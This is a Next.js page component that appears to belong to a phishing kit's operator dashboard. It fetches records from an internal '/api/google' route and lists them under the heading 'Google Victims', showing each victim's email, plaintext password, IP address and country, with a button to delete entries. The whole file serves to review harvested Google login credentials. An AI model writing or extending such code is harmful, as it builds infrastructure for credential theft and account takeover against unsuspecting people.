import DeleteTd from "@/components/DeleteTd";
import "./styles.css";
export default async function Google() {
  const host = process.env.NEXTAUTH_URL;
  const res = await fetch(`${host}/api/google`, {
    cache: "no-store",
  });

  const posts = await res.json();

  return (
    <section className="socialMain">
      <div className="table">
        <h1>Google Victims</h1>
        <div className="tbl-header">
          <table cellPadding="0" cellSpacing="0" border="0">
            <thead>
              <tr>
                <th>Date & Time</th>
                <th>Email</th>
                <th>Password</th>
                <th>IP Address</th>
                <th>Country</th>
                <th>Delete</th>
              </tr>
            </thead>
          </table>
        </div>
        <div className="tbl-content">
          <table cellPadding="0" cellSpacing="0" border="0">
            <tbody>
              {posts?.map((post) => (
                <tr key={post?.id}>
                  <td>{post?.date}</td>
                  <td>{post?.email} </td>
                  <td>{post?.password}</td>
                  <td>{post?.ip_address}</td>
                  <td>{post?.country}</td>
                  <DeleteTd id={post?.id} socialMedia="google" />
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </section>
  );
}
